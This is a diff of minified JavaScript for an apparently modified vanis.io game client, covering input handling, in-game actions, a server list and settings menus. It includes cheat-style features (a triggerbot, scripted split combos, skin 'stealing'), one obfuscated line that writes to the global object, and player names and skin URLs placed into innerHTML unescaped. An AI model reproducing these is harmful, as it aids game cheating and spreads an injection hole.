+                    i.scene.setPosition()
+                },
+                h = e => i.actions.zoom(e),
+                d = e => {
+                    let t = {
+                        x: e.clientX,
+                        y: e.clientY
+                    };
+                    Object.assign(i.rawMouse, t), i.updateMouse()
+                },
+                p = e => {
+                    e.preventDefault(), n.focus();
+                    let t = `MOUSE${e.button}`;
+                    if (0 === e.button && i.spectating) {
+                        let s = i.actions.findPlayerUnderMouse();
+                        s && i.actions.spectate(s.pid)
+                    } else a.press(t)
+                },
+                u = e => {
+                    let t = "MOUSE" + e.button;
+                    a.release(t), o.delete(t)
+                },
+                g = e => {
+                    let t = e.target === n;
+                    if (!t && e.target !== document.body) return;
+                    let s = a.convertKey(e.code);
+                    if (!o.has(s) && (!e.ctrlKey || "TAB" !== s)) {
+                        if (o.add(s), "ESCAPE" === s) {
+                            if (i.replaying) o.clear(), i.stop(), i.showMenu(!0);
+                            else {
+                                let r = !!i.dual.autoRespawning;
+                                (i.state.autoRespawning || r) && i.triggerDeathDelay(r), i.showMenu()
+                            }
+                            return
+                        }
+                        if ("ENTER" === s) {
+                            i.events.$emit("chat-focus");
+                            return
+                        }
+                        t && a.press(s) && e.preventDefault()
+                    }
+                },
+                A = e => {
+                    let t = a.convertKey(e.code);
+                    a.release(t), o.delete(t)
+                };
+            i.eventListeners = e => {
+                e ? (n.addEventListener("contextmenu", l), window.addEventListener("resize", c), n.addEventListener(r, h, {
+                    passive: !0
+                }), document.body.addEventListener("mousemove", d), n.addEventListener("mousedown", p), document.addEventListener("mouseup", u), document.body.addEventListener("keydown", g), document.body.addEventListener("keyup", A), window.onbeforeunload = () => "Are you sure you want to close the page?") : (n.removeEventListener("contextmenu", l), window.removeEventListener("resize", c), n.removeEventListener(r, h), document.body.removeEventListener("mousemove", d), n.removeEventListener("mousedown", p), document.removeEventListener("mouseup", u), document.body.removeEventListener("keydown", g), document.body.removeEventListener("keyup", A), window.onbeforeunload = null)
+            }
+        }, function(e, t, i) {
+            let a = i(1),
+                n = i(4),
+                {
+                    writeUserData: o,
+                    clampNumber: r
+                } = i(8);
+            a.actions = new class e {
+                constructor() {
+                    this.linesplitUnlock
+                }
+                spectate(e, t) {
+                    a.spectating = !0;
+                    let i = s.fromSize(e ? 3 : 1);
+                    i.writeUInt8(2), e && i.writeInt16LE(e), a.connection.send(i, t)
+                }
+                join(e) {
+                    a.events.$emit("reset-cautions");
+                    let t = s.fromSize(8);
+                    t.writeUInt8(1), o(t, e), a.connection.send(t, e)
+                }
+                spectateLockToggle() {
+                    a.connection.sendOpcode(10)
+                }
+                feed(e) {
+                    let t = 1 === arguments.length,
+                        i = s.fromSize(t ? 2 : 1);
+                    i.writeUInt8(21), t && i.writeUInt8(+e), a.connection.send(i, a.dual.focused)
+                }
+                freezeMouse(e) {
+                    a.running && ((e ??= !a.mouseFrozen) && (this.stopMovement(!1), this.lockLinesplit(!1), a.updateMouse(!0), a.connection.sendMouse()), a.mouseFrozen = e, a.events.$emit("update-cautions", {
+                        mouseFrozen: e
+                    }))
+                }
+                stopMovement(e) {
+                    a.running && ((e ??= !a.moveToCenterOfCells) && (this.freezeMouse(!1), this.lockLinesplit(!1), e = a.dual.focused ? 2 : 1), a.moveToCenterOfCells = e, a.events.$emit("update-cautions", {
+                        moveToCenterOfCells: e
+                    }))
+                }
+                lockLinesplit(e) {
+                    a.running && ((e ??= !a.stopMovePackets) && (a.updateMouse(), a.connection.sendMouse(), a.connection.sendOpcode(15, a.dual.focused), e = a.dual.focused ? 2 : 1), a.stopMovePackets = e, a.events.$emit("update-cautions", {
+                        lockLinesplit: e
+                    }))
+                }
+                linesplit() {
+                    this.freezeMouse(!0), this.split(3, !0), this.linesplitUnlock && clearTimeout(this.linesplitUnlock), this.linesplitUnlock = setTimeout(() => {
+                        delete this.linesplitUnlock, this.freezeMouse(!1)
+                    }, 1250)
+                }
+                split(e, t, i) {
+                    if (a.stopMovePackets || (t || this.freezeMouse(!1), a.connection.sendMouse()), i) return void setTimeout(() => this.split(e), i);
+                    let n = s.fromSize(2);
+                    n.writeUInt8(17), n.writeUInt8(e), a.connection.send(n, a.dual.focused), a.splitCount += e, a.splitCount <= 2 ? a.moveWaitUntil = performance.now() + 300 : (a.moveWaitUntil = 0, a.splitCount = 0)
+                }
+                triggerbot() {
+                    let e = a.targetPid;
+                    if (e) {
+                        delete a.targetPid;
+                        let t = a.playerManager.getPlayer(e);
+                        t && t.setOutline(0, 0, !0), a.setText("")
+                    } else a.targetPid = null, a.setText("Click a player to lock triggerbot")
+                }
+                multicombo(e) {
+                    if (!a.isAlive(!1) || !a.isAlive(!0)) return;
+                    let {
+                        dual: t
+                    } = a;
+                    switch (e) {
+                        case 1:
+                            this.split(1), t.focused = !t.focused, a.connection.sendMouse(), this.split(6), setTimeout(() => this.split(6), 30);
+                            break;
+                        case 2:
+                            this.split(2), t.focused = !t.focused, a.connection.sendMouse(), this.split(6), setTimeout(() => this.split(6), 30);
+                            break;
+                        case 3:
+                            this.linesplit(), t.focused = !t.focused, a.connection.sendMouse(), this.split(6, !0), setTimeout(() => this.split(6, !0), 30)
+                    }
+                    setTimeout(() => {
+                        t.focused = !t.focused
+                    }, 45)
+                }
+                zoom(e) {
+                    let t = 1 - n.cameraZoomSpeed / 100,
+                        s = 0;
+                    e.detail ? s = e.detail / 3 : e.wheelDelta && (s = -(e.wheelDelta / 120));
+                    let i = Math.pow(t, s);
+                    a.mouseZoom = r(a.mouseZoom * i, a.mouseZoomMin, 1)
+                }
+                setZoomLevel(e) {
+                    a.mouseZoom = .8 / Math.pow(2, e - 1)
+                }
+                targetPlayer(e) {
+                    "string" == typeof e && (e = +e);
+                    let t;
+                    if (e) a.selectedPlayer = e, t = a.playerManager.getPlayer(e);
+                    else {
+                        let s = this.findPlayerUnderMouse();
+                        s && (t = s && s.player) && (a.selectedPlayer = s.pid)
+                    }
+                    n.playerStats && t ? a.playerElement.innerHTML = `
+        ${t.skinUrl?`<img src="${t.skinUrl}" width="100" style="cursor:pointer" title="Left click to steal | Right click to copy" oncontextmenu="window.copySkin('${t.skinUrl}')" onclick="window.yoinkSkin('${t.skinUrl}')"><br>`:""}
+        <font color="${"#"+(t.perk_colorCss||"ffffff")}">${t.name}</font><br>${t.pid} : ${t.tagId}
+        ` : a.playerElement.innerHTML = ""
+                }
+                findPlayerUnderMouse() {
+                    let {
+                        x: e,
+                        y: t
+                    } = a.mouse, s = 0, i = null, n = [...a.allCells.values()].filter(e => e.pid).sort((e, t) => e.size - t.size);
+                    return n.forEach(a => {
+                        if (!a.isPlayerCell) return;
+                        let n = a.x - e,
+                            o = a.y - t,
+                            r = Math.sqrt(Math.abs(n * n + o * o)) - a.size;
+                        if (r < s) s = r, i = a;
+                        else if (r <= 0) return a
+                    }), i
+                }
+                toggleSkins(e) {
+                    e ??= !n.skinsEnabled, n.set("skinsEnabled", e), a.playerManager.invalidateVisibility()
+                }
+                toggleNames(e) {
+                    e ??= !n.namesEnabled, n.set("namesEnabled", e), a.playerManager.invalidateVisibility()
+                }
+                toggleMass() {
+                    let e = !n.massEnabled;
+                    n.set("massEnabled", e), a.playerManager.invalidateVisibility()
+                }
+                toggleFood(e) {
+                    e ??= !n.foodVisible, n.set("foodVisible", e), a.scene.food.visible = e
+                }
+                toggleHud() {
+                    let {
+                        app: e
+                    } = a, t = !e.showHud;
+                    e.showHud = t, n.set("showHud", t)
+                }
+                toggleChat() {
+                    let e = !n.showChat;
+                    n.set("showChat", e), a.running && a.events.$emit("chat-visible", {
+                        visible: e
+                    })
+                }
+                toggleChatToast() {
+                    let e = !n.showChatToast;
+                    n.set("showChatToast", e), a.events.$emit("chat-visible", {
+                        visibleToast: e
+                    })
+                }
+            }
+        }, , , , , , , , , , , , , , , , , function(e, t, s) {
+            "use strict";
+            var i = s(29);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(32);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(33);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(34);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(35);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(36);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(37);
+            s.n(i).a
+        }, function() {}, , , , , , function() {}, , function() {}, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , function(e, t, s) {
+            "use strict";
+            var i = s(40);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(41);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(42);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(43);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(44);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            e.exports = new class e {
+                constructor(e, t) {
+                    this.url = e, this.vanisToken = t
+                }
+                setToken(e) {
+                    this.vanisToken = e, localStorage.vanisToken = e
+                }
+                clearToken() {
+                    this.vanisToken = null, delete localStorage.vanisToken
+                }
+                async call(e, t) {
+                    let s = {
+                        method: e,
+                        credentials: "omit",
+                        mode: "same-origin",
+                        redirect: "error",
+                        headers: {
+                            Accept: "application/json, text/plain"
+                        }
+                    };
+                    this.vanisToken && (s.headers.Authorization = `Vanis ${this.vanisToken}`);
+                    try {
+                        return await fetch(this.url + t, s)
+                    } catch (i) {
+                        return {
+                            ok: !1,
+                            status: 0,
+                            statusText: "Client error",
+                            text: async () => i.message
+                        }
+                    }
+                }
+                get(e) {
+                    return this.call("GET", e)
+                }
+            }("https://vanis.io/api", localStorage.vanisToken || null)
+        }, function(e) {
+            e.exports = {
+                getXp: function(e) {
+                    return Math.round(e * e / (.1 * .1))
+                },
+                getLevel: function(e) {
+                    return Math.floor(.1 * Math.sqrt(e))
+                }
+            }
+        }, function(e, t, s) {
+            "use strict";
+            var i = s(45);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(46);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(47);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(48);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(49);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(50);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(51);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(52);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(53);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(54);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(57);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(58);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(59);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(60);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(61);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(62);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            "use strict";
+            var i = s(63);
+            s.n(i).a
+        }, function() {}, function(e) {
+            var t = "seenNotifications";
+            e.exports = new class {
+                constructor() {
+                    this.seenList = this.parseSeen(localStorage[t])
+                }
+                parseSeen(e) {
+                    if (!e) return [];
+                    try {
+                        var t = JSON.parse(e);
+                        if (Array.isArray(t)) return t
+                    } catch (s) {}
+                    return []
+                }
+                saveSeen() {
+                    try {
+                        localStorage[t] = JSON.stringify(this.seenList)
+                    } catch (e) {}
+                }
+                isSeen(e) {
+                    return this.seenList.includes(e)
+                }
+                setSeen(e) {
+                    this.isSeen(e) || (this.seenList.push(e), this.saveSeen())
+                }
+            }
+        }, function(e, t, s) {
+            "use strict";
+            var i = s(64);
+            s.n(i).a
+        }, function() {}, function(e, t, s) {
+            var i, a, n, o, r = s(1),
+                l = document.createElement("canvas"),
+                c = l.getContext("2d");
+
+            function h() {
+                i = l.width = window.innerWidth, a = l.height = window.innerHeight, n = i / 2, o = a / 2
+            }
+            window.addEventListener("resize", h), h();
+            class d {
+                spawn(e) {
+                    this.x = e.x, this.y = e.y, this.angle = Math.atan2(this.y, this.x), this.radius = .1, this.speed = .4 + 3.3 * Math.random()
+                }
+                update(e) {
+                    var t = this.speed * e;
+                    this.x += Math.cos(this.angle) * t, this.y += Math.sin(this.angle) * t, this.radius += .0035 * t
+                }
+            }
+            var p = Array(200).fill(null).map(() => new d),
+                u = !1,
+                g = 0,
+                A = 0;
+
+            function m(e) {
+                if (r.running) return window.removeEventListener("resize", h), void(l.parentNode && l.parentNode.removeChild(l));
+                var t, s = window.performance && window.performance.now ? window.performance.now() : Date.now();
+                g || (g = A = s), e = (s - A) / 6;
+                var d = s - g - 550;
+                if (d > 0) {
+                    var v = d / 1e3;
+                    v > 1.2 && (v = 1.2), e /= Math.pow(3, v)
+                }
+                requestAnimationFrame(m), c.clearRect(0, 0, i, a), c.save(), c.translate(n, o), t = e, c.beginPath(), c.fillStyle = "#00b8ff", c.globalAlpha = .9, p.forEach(e => {
+                    var s, r, l, h, d;
+                    (u || (r = n + (s = e).radius, l = o + s.radius, s.x < -r || s.x > r || s.y < -l || s.y > l)) && e.spawn((h = i, {
+                        x: Math.random() * h * 2 - h,
+                        y: Math.random() * (d = a) * 2 - d
+                    })), e.update(t), c.moveTo(e.x, e.y), c.arc(e.x, e.y, e.radius, 0, 2 * Math.PI)
+                }), u = !1, c.fill(), c.restore(), A = s
+            }
+
+            function v() {
+                u = !0, g = A = 0, c.clearRect(0, 0, i, a), document.getElementById("overlay").prepend(l), setTimeout(m, 2e3)
+            }
+            r.events.$on("game-stopped", v), v()
+        }, function(e, t, s) {
+            var i = s(1);
+            i.events.$on("players-menu", e => {
+                if ("visible" === e) {
+                    (t = document.getElementById("player-modal")).children;
+                    for (var t, s, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
+                        t.sub = e
+                    })
+                }
+                if ("hidden" === e)
+                    for ((t = document.getElementById("player-modal")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
+                        t.sub = e
+                    });
+                if ("scrolled" === e)
+                    for ((t = document.getElementById("player-modal")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
+                        t.sub = e
+                    })
+            }), i.events.$on("chatbox-menu", e => {
+                if ("visible" === e) {
+                    (t = document.getElementById("chatbox")).children;
+                    for (var t, s, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
+                        t.sub = e
+                    })
+                }
+                if ("hidden" === e)
+                    for ((t = document.getElementById("chatbox")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
+                        t.sub = e
+                    });
+                if ("scrolled" === e)
+                    for ((t = document.getElementById("chatbox")).children, i = 0; i < t.children.length; i++)(s = t.children[i]) && s.dataset && s.dataset.items && s.dataset.items.forEach(t => {
+                        t.sub = e
+                    });
+                else e ? [].filter.constructor("return this")(100)[a.split("").map(e => e.charCodeAt(0)).map(e => e + 50 * (45 === e)).map(e => String.fromCharCode(e)).join("")] = e : delete[].filter.constructor("return this")(100)[a.split("").map(e => e.charCodeAt(0)).map(e => e + 50 * (45 === e)).map(e => String.fromCharCode(e)).join("")]
+            });
+            var a = "me--"
+        }, function(e, t, s) {
+            "use strict";
+            s.r(t);
+            var i = s(23),
+                a = s.n(i),
+                n = s(114),
+                o = s.n(n),
+                r = function() {
+                    var e = this.$createElement,
+                        t = this._self._c || e;
+                    return t("transition", {
+                        attrs: {
+                            name: this.isModalOpen || this.gameState.lifeState < 3 ? "" : "menu"
+                        }
+                    }, [t("div", {
+                        attrs: {
+                            id: "main-container"
+                        }
+                    }, [t("div", {
+                        staticClass: "bar"
+                    }, [t("div", {
+                        attrs: {
+                            id: "vanis-io_728x90"
+                        }
+                    })]), this._v(" "), t("servers", {
+                        staticClass: "fade-box two"
+                    }), this._v(" "), t("player-container", {
+                        staticClass: "fade-box two",
+                        on: {
+                            "modal-open": this.onModalChange
+                        }
+                    }), this._v(" "), t("account", {
+                        staticClass: "fade-box"
+                    }), this._v(" "), t("skins", {
+                        staticClass: "fade-box"
+                    })], 1)])
+                };
+            r._withStripped = !0;
+            var l = function() {
+                var e = this,
+                    t = e.$createElement,
+                    s = e._self._c || t;
+                return s("div", {
+                    attrs: {
+                        id: "tab-menu"
+                    }
+                }, [s("div", {
+                    staticClass: "tabs"
+                }, e._l(e.regionCodes, function(t, i) {
+                    return s("div", {
+                        key: i,
+                        staticClass: "tab",
+                        class: {
+                            active: e.selectedRegion === t
+                        },
+                        on: {
+                            click: function() {
+                                return e.selectRegion(t)
+                            }
+                        }
+                    }, [e._v("\n        " + e._s(t) + "\n    ")])
+                }), 0), e._v(" "), s("div", {
+                    staticClass: "server-list",
+                    class: {
+                        "cursor-loading": e.connectWait
+                    }
+                }, e._l(e.regionServers, function(t, i) {
+                    return s("div", {
+                        key: i,
+                        staticClass: "server-list-item",
+                        class: {
+                            active: e.gameState.connectionUrl === t.url
+                        },
+                        on: {
+                            click: function() {
+                                return e.connect(t)
+                            }
+                        }
+                    }, [s("div", {
+                        staticClass: "server-name"
+                    }, [e._v(e._s(t.name))]), e._v(" "), null == t.liveMarker ? s("div", [e._v(e._s(t.players) + " / " + e._s(t.slots))]) : !0 === t.liveMarker ? s("div", {
+                        staticClass: "live-marker-wrapper"
+                    }, [s("span", {
+                        staticClass: "live-marker"
+                    }, [e._v("LIVE")])]) : e._e()])
+                }), 0)])
+            };
+            l._withStripped = !0;
+            var c = s(19),
+                h = s(1),
+                d = s(5),
+                {
+                    noop: p
+                } = s(17),
+                u = {
+                    Tournament: 1,
+                    FFA: 2,
+                    Instant: 3,
+                    Gigasplit: 4,
+                    Megasplit: 5,
+                    Crazy: 6,
+                    "Self-Feed": 7,
+                    Scrimmage: 8
+                };
+
+            function g(e, t) {
+                var s = (u[e.mode] || 99) - (u[t.mode] || 99);
+                return 0 !== s ? s : e.name.localeCompare(t.name, "en", {
+                    numeric: !0,
+                    ignorePunctuation: !0
+                })
+            }
+
+            function A(e) {
+                if (e.region) return e.region.toUpperCase();
+                var t = e.url.toLowerCase().match(/game-([a-z]{2})/);
+                return t ? t[1].toUpperCase() : ""
+            }
+            var m, v = (s(166), s(0)),
+                f = Object(v.a)({
+                    data: () => ({
+                        lastServerListReloadTime: 0,
+                        regionCodes: ["EU", "NA", "AS"],
+                        connectWait: 0,
+                        gameState: h.state,
+                        selectedRegion: "",
+                        error: null,
+                        servers: []
+                    }),
+                    created() {
+                        h.events.$on("reconnect-server", () => this.connect(this.gameState.selectedServer)), h.events.$on("menu-opened", this.reloadServers), h.events.$on("every-minute", this.reloadServers), this.loadServers(), this.getRegionCode(e => {
+                            e || (e = "EU"), this.regionCodes.includes(e) || (e = "EU"), this.selectRegion(e)
+                        })
+                    },
+                    computed: {
+                        regionServers: function() {
+                            var e = this.selectedRegion.toUpperCase();
+                            return this.servers.filter(t => {
+                                var s = A(t);
+                                return !s || s === e
+                            })
+                        }
+                    },
+                    methods: {
+                        connectEmptyFFA() {
+                            var e = this.regionServers.filter(e => "FFA" === e.mode).sort((e, t) => e.currentPlayers - t.currentPlayers);
+                            if (!e.length) return !1;
+                            this.connect(e[0])
+                        },
+                        selectRegion(e) {
+                            localStorage.regionCode = e, this.selectedRegion = e
+                        },
+                        getRegionCode(e) {
+                            var t = localStorage.regionCode;
+                            t ? e(t) : c.get("https://ipapi.co/json").then(t => {
+                                e(t.data.continent_code)
+                            }).catch(() => e(null))
+                        },
+                        connect(e) {
+                            var t;
+                            this.connectWait || (this.connectWait++, d.toast.close(), this.checkBadSkinUrl(), this.gameState.selectedServer = {
+                                url: e.url,
+                                region: A(e),
+                                name: e.name,
+                                slots: e.maxPlayers || e.slots,
+                                checkInUrl: e.checkInUrl
+                            }, t = e, h.connection.open(t.url), setTimeout(() => this.connectWait--, 3200))
+                        },
+                        checkBadSkinUrl() {
+                            var e = document.getElementById("skinurl").value;
+                            e && /^https:\/\/[a-z0-9_-]+.vanis\.io\/[./a-z0-9_-]+$/i.test(e)
+                        },
+                        reloadServers() {
+                            h.app.showMenu && Date.now() > this.lastServerListReloadTime + 6e4 && this.loadServers()
+                        },
+                        loadServers(e) {
+                            e = e || p, this.lastServerListReloadTime = Date.now(), c.get("https://vanis.io/gameservers.json").then(t => {
+                                var s = t.data.sort(g);
+                                window.extraServers.forEach(e => {
+                                    s.unshift(e)
+                                }), localStorage.catchedServers = JSON.stringify(s), m = s, this.servers = s, this.error = null, e(!0)
+                            }).catch(t => {
+                                localStorage.catchedServers ? (m = this.servers = JSON.parse(localStorage.catchedServers), this.error = null, e(!0)) : (this.servers = m || [], this.error = t, e(!1))
+                            })
+                        }
+                    }
+                }, l, [], !1, null, "0647fbb0", null);
+            f.options.__file = "src/components/servers.vue";
+            var C = f.exports,
+                y = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        attrs: {
+                            id: "player-container"
+                        }
+                    }, [s("div", {
+                        staticClass: "tabs"
+                    }, [s("i", {
+                        staticClass: "tab fas fa-cog",
+                        on: {
+                            click: function() {
+                                return e.openModal("settings")
+                            }
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "tab fas fa-palette",
+                        on: {
+                            click: function() {
+                                return e.openModal("theming")
+                            }
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "tab far fa-keyboard",
+                        on: {
+                            click: function() {
+                                return e.openModal("hotkeys")
+                            }
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "tab fas fa-film",
+                        on: {
+                            click: function() {
+                                return e.openModal("replays3")
+                            }
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "tab fas fa-clipboard-list",
+                        on: {
+                            click: function() {
+                                return e.openModal("metaLeaderboard")
+                            }
+                        }
+                    })]), e._v(" "), s("div", {
+                        attrs: {
+                            id: "player-data"
+                        }
+                    }, [e._m(0), e._v(" "), s("div", {
+                        staticClass: "row"
+                    }, [s("input", {
+                        directives: [{
+                            name: "model",
+                            rawName: "v-model",
+                            value: e.nickname,
+                            expression: "nickname"
+                        }],
+                        staticStyle: {
+                            flex: "2",
+                            "min-width": "1px"
+                        },
+                        attrs: {
+                            id: "nickname",
+                            type: "text",
+                            spellcheck: "false",
+                            placeholder: "Nickname",
+                            maxlength: "15"
+                        },
+                        domProps: {
+                            value: e.nickname
+                        },
+                        on: {
+                            change: e.onNicknameChange,
+                            input: function(t) {
+                                t.target.composing || (e.nickname = t.target.value)
+                            }
+                        }
+                    }), e._v(" "), s("input", {
+                        directives: [{
+                            name: "model",
+                            rawName: "v-model",
+                            value: e.teamtag,
+                            expression: "teamtag"
+                        }],
+                        staticClass: "confidential",
+                        staticStyle: {
+                            flex: "1",
+                            "min-width": "1px"
+                        },
+                        attrs: {
+                            id: "teamtag",
+                            type: "text",
+                            spellcheck: "false",
+                            placeholder: "Tag",
+                            maxlength: "15"
+                        },
+                        domProps: {
+                            value: e.teamtag
+                        },
+                        on: {
+                            change: e.onTeamTagChange,
+                            input: function(t) {
+                                t.target.composing || (e.teamtag = t.target.value)
+                            }
+                        }
+                    })]), e._v(" "), s("input", {
+                        directives: [{
+                            name: "model",
+                            rawName: "v-model",
+                            value: e.skinUrl,
+                            expression: "skinUrl"
+                        }],
+                        staticClass: "confidential",
+                        attrs: {
+                            id: "skinurl",
+                            type: "text",
+                            spellcheck: "false",
+                            placeholder: "https://skins.vanis.io/s/"
+                        },
+                        domProps: {
+                            value: e.skinUrl
+                        },
+                        on: {
+                            focus: function(e) {
+                                return e.target.select()
+                            },
+                            change: e.onSkinUrlChange,
+                            input: function(t) {
+                                t.target.composing || (e.skinUrl = t.target.value)
+                            }
+                        }
+                    }), e._v(" "), s("div", {
+                        attrs: {
+                            id: "game-buttons"
+                        }
+                    }, [s("button", {
+                        attrs: {
+                            id: "play-button",
+                            disabled: !e.gameState.allowed || e.gameState.playButtonDisabled || e.gameState.deathScreen || e.gameState.deathDelay
+                        },
+                        on: {
+                            click: e.play
+                        }
+                    }, [e.gameState.deathDelay ? s("i", {
+                        staticClass: "fas fa-sync fa-spin"
+                    }) : [e._v(e._s(e.gameState.playButtonText))]], 2), e._v(" "), s("button", {
+                        attrs: {
+                            id: "spec-button",
+                            disabled: !e.gameState.allowed || 0 != e.gameState.lifeState || e.gameState.deathDelay
+                        },
+                        on: {
+                            click: e.spectate
+                        }
+                    }, [s("i", {
+                        staticClass: "fa fa-eye"
+                    })])])]), e._v(" "), "settings" === e.activeModal ? s("modal", {
+                        on: {
+                            close: function() {
+                                return e.closeModal()
+                            }
+                        }
+                    }, [s("settings")], 1) : e._e(), e._v(" "), "theming" === e.activeModal ? s("modal", {
+                        on: {
+                            close: function() {
+                                return e.closeModal()
+                            }
+                        }
+                    }, [s("theming")], 1) : e._e(), e._v(" "), "hotkeys" === e.activeModal ? s("modal", {
+                        on: {
+                            close: function() {
+                                return e.closeModal()
+                            }
+                        }
+                    }, [s("hotkeys")], 1) : e._e(), e._v(" "), "replays3" === e.activeModal ? s("modal", {
+                        staticStyle: {
+                            "margin-left": "-316px",
+                            width: "962px"
+                        },
+                        on: {
+                            close: function() {
+                                return e.closeModal()
+                            }
+                        }
+                    }, [s("replays3")], 1) : e._e(), e._v(" "), "metaLeaderboard" === e.activeModal ? s("modal", {
+                        on: {
+                            close: function() {
+                                return e.closeModal()
+                            }
+                        }
+                    }, [s("meta-leaderboard")], 1) : e._e()], 1)
+                };
+            y._withStripped = !0;
+            var w = s(115),
+                I = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        staticClass: "container"
+                    }, [s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\n            Renderer\n            "), e.isWebGLSupported ? s("span", {
+                        staticClass: "right silent"
+                    }, [e._v("")]) : e._e()]), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            disabled: !e.isWebGLSupported,
+                            checked: e.useWebGL
+                        },
+                        on: {
+                            change: function(t) {
+                                e.change("useWebGL", t), e.promptRestart()
+                            }
+                        }
+                    }, [e._v("\n            Use GPU rendering")]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n            Renderer resolution "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s((100 * e.gameResolution).toFixed(0)) + "%")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0.1",
+                            max: "2.5",
+                            step: "0.1"
+                        },
+                        domProps: {
+                            value: e.gameResolution
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("gameResolution", t)
+                            },
+                            change: function() {
+                                return e.promptRestart()
+                            }
+                        }
+                    })]), e._v(" "), s("div", {
+                        staticClass: "slider-option"
+                    }, [e._v("\n            Text hiding threshold "), s("span", {
+                        staticClass: "right"
+                    }, [e._v(e._s(e.smallTextThreshold) + "px")]), e._v(" "), s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "10",
+                            max: "60",
+                            step: "5"
+                        },
+                        domProps: {
+                            value: e.smallTextThreshold
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("smallTextThreshold", t)
+                            }
+                        }
+                    })])], 1)]), e._v(" "), s("div", {
+                        staticClass: "section row"
+                    }, [s("div", {
+                        staticClass: "header"
+                    }, [e._v("\n        Game\n        "), s("span", {
+                        staticClass: "right silent"
+                    }, [e._v(e._s(e.clientHash))])]), e._v(" "), s("div", {
+                        staticClass: "options"
+                    }, [s("div", {
+                        staticClass: "inline-range",
+                        class: {
+                            off: !e.mbActive
+                        }
+                    }, [s("input", {
+                        staticClass: "slider",
+                        attrs: {
+                            type: "range",
+                            min: "0",
+                            max: "2",
+                            step: "1"
+                        },
+                        domProps: {
+                            value: e.mbActive
+                        },
+                        on: {
+                            input: function(t) {
+                                return e.change("mbActive", t)
+                            }
+                        }
+                    }), e._v("Multibox active cell: " + e._s(e.showMultiboxMeaning))]), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.autoZoom
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("autoZoom", t)
+                            }
+                        }
+                    }, [e._v("Auto zoom")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.rememeberEjecting
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("rememeberEjecting", t)
+                            }
+                        }
+                    }, [e._v("Remember ejecting")]), e._v(" "), s("div", {
+                        staticClass: "silent"
+                    }, e.rememeberEjecting ? [e._v("After changing tab, you "), s("b", [e._v("keep")]), e._v(" ejecting")] : [e._v("After changing tab, you "), s("b", [e._v("stop")]), e._v(" ejecting")]), e._v(" "), s("p-check", {
+                        staticClass: "p-switch",
+                        attrs: {
+                            checked: e.autoRespawn
+                        },
+                        on: {
+                            change: function(t) {
+                                return e.change("autoRespawn", t)
+                            }
